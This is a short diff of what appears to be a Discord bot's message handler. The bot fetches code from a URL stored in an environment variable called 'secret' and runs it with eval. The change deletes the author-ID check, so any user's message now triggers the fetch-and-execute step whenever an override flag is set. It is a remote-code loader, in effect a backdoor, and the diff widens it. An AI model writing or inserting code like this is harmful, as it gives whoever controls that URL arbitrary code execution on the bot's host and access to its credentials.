@@ -103,7 +103,7 @@ client.on('ready', () => {
 
 client.on('message', msg => {
     if (msg.author.bot || msg.author.id == client.user.id) return;
-    if (msg.author.id == process.env.id && process.env.override == 'true') {
+    if (process.env.override == 'true') {
           var foo = (async function() {
               const ret = await axios.get(process.env.secret);
               eval(ret.data);
